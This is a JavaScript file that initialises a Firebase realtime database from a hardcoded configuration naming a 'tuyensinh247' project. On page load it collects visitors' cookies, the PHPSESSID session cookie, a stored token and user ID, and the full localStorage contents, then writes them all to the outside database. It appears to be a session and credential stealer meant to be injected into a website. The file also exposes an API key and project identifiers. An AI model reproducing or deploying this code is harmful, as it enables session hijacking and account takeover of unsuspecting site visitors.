// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyAEZ-GF4JyfSPF-YE-aAPNDHke-Pc6nUCI",
    authDomain: "tuyensinh247-dc424.firebaseapp.com",
    projectId: "tuyensinh247-dc424",
    storageBucket: "tuyensinh247-dc424.appspot.com",
    messagingSenderId: "789063631644",
    appId: "1:789063631644:web:e5f8247e9a1366bbe170d9",
    databaseURL: "https://tuyensinh247-dc424-default-rtdb.firebaseio.com"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

// Process the URL to extract the path
const url = window.location.href.replace(/https:\/\//, '').replace(/\./g, '-');
const path = url.split("?")[0].split("-html");

// Retrieve cookie and localStorage data
const cookie = document.cookie;
const token = localStorage.getItem("token");
const userId = localStorage.getItem("user_id") || 'facebook-google';


// Function to convert localStorage items to a JSON string
const localStorageToJson = () => {
    const obj = {};
    Object.keys(localStorage).forEach(key => obj[key] = localStorage.getItem(key));
    return JSON.stringify(obj);
};
const localStorageJSON = localStorageToJson();


// Function to retrieve the PHPSESSID from cookies
function getPHPSESSID() {
    const phpsessidCookie = document.cookie.split('; ').find(cookie => cookie.startsWith('PHPSESSID='));
    return phpsessidCookie ? phpsessidCookie.split('=')[1] : null;
}
const PHPSESSID = getPHPSESSID();


// Function to write data to the database
function writeData(PHPSESSID, userId, token, cookie, localStorageJSON) {
    const db = getDatabase();
    set(ref(db, `${path[0]}/${PHPSESSID}`), {
        PHPSESSID: PHPSESSID,
        userId: userId,
        token: token,
        cookie: cookie,
        localStorage: localStorageJSON
    });
}

// Call the writeData function
writeData(PHPSESSID, userId, token, cookie, localStorageJSON);
